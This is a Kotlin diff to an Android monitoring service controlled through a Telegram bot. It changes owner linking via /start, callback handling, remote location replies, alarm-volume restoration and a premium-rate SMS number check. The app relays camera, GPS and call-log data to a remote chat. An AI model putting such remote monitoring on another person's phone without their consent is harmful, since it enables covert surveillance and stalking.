@@ -152,6 +152,27 @@ class MonitoringService : Service() {
         callLogRepository = CallLogRepository(this)
         messageQueue = MessageQueue.getInstance(this)
         cameraService = CameraService(this)
+        restoreRingVolumeIfStuck()
+    }
+
+    private fun restoreRingVolumeIfStuck() {
+        try {
+            if (ringBusy.get()) return
+            val previous = try { preferencesManager.ringPrevVolume } catch (_: Exception) { -1 }
+            val savedAt = try { preferencesManager.ringSavedAt } catch (_: Exception) { 0L }
+            if (previous < 0 || savedAt <= 0L) return
+            val audioManager = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
+            try {
+                audioManager.setStreamVolume(android.media.AudioManager.STREAM_ALARM, previous, 0)
+            } catch (_: Exception) {
+            }
+            try {
+                preferencesManager.ringPrevVolume = -1
+                preferencesManager.ringSavedAt = 0L
+            } catch (_: Exception) {
+            }
+        } catch (_: Exception) {
+        }
     }
 
     private fun startForegroundImmediate() {
@@ -696,12 +717,8 @@ class MonitoringService : Service() {
                     if (cachedOwnerId == 0L && senderId.isNotEmpty() && msgChatId == senderId && senderId != chatId && rawText.substringBefore(" ").substringBefore("@").lowercase(java.util.Locale.ROOT) == "/start") {
                         val learned = rememberOwner(senderId.toLongOrNull() ?: 0L)
                         if (learned) {
-                            serviceScope.launch {
-                                registerBotCommands()
-                            }
-                            serviceScope.launch {
-                                sendToTelegram("Owner linked via /start.")
-                            }
+                            registerBotCommands()
+                            sendToTelegram("Owner linked via /start.")
                         }
                     }
                     val ownerOk = isOwner(senderId)
@@ -754,12 +771,13 @@ class MonitoringService : Service() {
         val chatId = try { preferencesManager.chatId } catch (_: Exception) { "" }
         val originChat = try { query.message?.chat?.id?.toString().orEmpty() } catch (_: Exception) { "" }
         if (sender != chatId && originChat != chatId) {
+            if (dupCallback) return
             try { answerCallback(query.id) } catch (_: Exception) { }
             return
         }
         val ownerOk = isOwner(sender)
-        answerCallback(query.id)
         if (dupCallback) return
+        answerCallback(query.id)
         val command = when (query.data) {
             "photo" -> "/photo"
             "location" -> "/location"
@@ -1069,13 +1087,11 @@ class MonitoringService : Service() {
                     sendToTelegram("⚠️ Location permission missing. Open Setup and grant Location permission.")
                 } else {
                     sendToTelegram("📍 Locating…")
-                    serviceScope.launch {
-                        val location = fetchLocation()
-                        if (location == null) {
-                            sendToTelegram("⚠️ Location unavailable. Make sure Location/GPS is turned on.")
-                        } else {
-                            sendToTelegram("📍 <b>Location</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\nAccuracy: ${location.accuracy.toInt()} m")
-                    }
+                    val location = fetchLocation()
+                    if (location == null) {
+                        sendToTelegram("⚠️ Location unavailable. Make sure Location/GPS is turned on.")
+                    } else {
+                        sendToTelegram("📍 <b>Location</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\nAccuracy: ${location.accuracy.toInt()} m")
                     }
                 }
             }
@@ -1951,8 +1967,18 @@ class MonitoringService : Service() {
     private fun isPremiumSmsNumber(raw: String): Boolean {
         val digits = raw.filter { it.isDigit() }
         if (digits.isEmpty()) return false
+        var intl = digits
+        if (intl.startsWith("00")) intl = intl.substring(2)
         val local = if (digits.startsWith("0")) digits.substring(1) else digits
         if (local == "1900" || local.startsWith("1900") || local == "900" || local == "976") return true
+        if (intl.startsWith("44")) {
+            val uk = intl.substring(2)
+            if (uk.startsWith("70") || uk.startsWith("90") || uk.startsWith("118") || uk.startsWith("09") || uk.startsWith("087") || uk.startsWith("084")) return true
+        }
+        if (intl.startsWith("1")) {
+            if (intl.substring(1).startsWith("900")) return true
+        }
+        if (intl.startsWith("809") || intl.startsWith("900")) return true
         if (local.length <= 6) {
             return true
         }
